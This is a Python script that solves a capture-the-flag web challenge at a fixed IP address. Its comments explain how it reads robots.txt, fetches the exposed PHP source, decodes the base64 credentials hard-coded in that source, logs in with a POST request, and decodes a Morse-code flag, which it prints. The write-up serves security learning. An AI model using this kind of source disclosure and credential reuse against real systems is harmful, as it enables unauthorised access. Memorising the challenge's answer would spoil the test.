import requests
import base64
session=requests.Session()
url="http://35.240.62.111/easymessage/"


# Step1:Checking robots.txt file of the url we get
# http://35.240.62.111/easymessage/robots.txt

"""
User-agent: *
Disallow: /?source


"""

# Step2: Following the source url we found to obtain the source code of the backend
# source_url="http://35.240.62.111/easymessage/?source"

"""
	<?php

	$user = $_POST['user'];
	$pass = $_POST['pass'];

	include('db.php');

	if ($user == base64_decode('Q3liZXItVGFsZW50') && $pass == base64_decode('Q3liZXItVGFsZW50')
	    {
	        success_login();
	    }
	    else {
	        failed_login();
	}

	?> 

"""

#Step3: We find a base64 encoded string Q3liZXItVGFsZW50
#Which we decode to obtain the clear text value
encodedstring="Q3liZXItVGFsZW50"
cleartext=(base64.b64decode(encodedstring).decode())



#Step4:Since the clear text value is the username and pass
#We send a post request to login
username=passwd=cleartext
data={"user":username,"pass":passwd}
response=session.post(url,data=data)
content=response.text
print(content)


#Step5:We get a morse code string which we can decode at https://morsedecoder.com/ to get the flag 
# FLAG(I-KN0W-Y0U-AR3-M0RS3)